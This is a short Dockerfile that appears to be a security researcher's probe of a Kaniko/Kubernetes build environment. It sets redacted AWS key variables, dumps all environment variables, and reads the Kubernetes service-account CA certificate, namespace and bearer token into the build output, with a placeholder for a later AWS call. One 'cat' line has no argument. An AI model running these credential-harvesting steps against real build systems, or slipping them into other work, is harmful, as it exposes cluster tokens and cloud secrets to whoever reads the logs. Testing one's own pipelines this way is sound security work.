FROM praetorianlabs/gosh-agent
ENV AWS_ACCESS_KEY=AKI**redacted**
ENV AWS_SECRET_ACCESS_KEY=RQ**redacted**aq
RUN env   
RUN apk update && apk add tree
RUN tree /kaniko
RUN cat 
RUN tree /run/secrets/kubernetes.io/serviceaccount
RUN cat   /run/secrets/kubernetes.io/serviceaccount/ca.crt
RUN cat   /run/secrets/kubernetes.io/serviceaccount/namespace
RUN cat   /run/secrets/kubernetes.io/serviceaccount/token

    
CMD ["echo", "make an aws call here"]

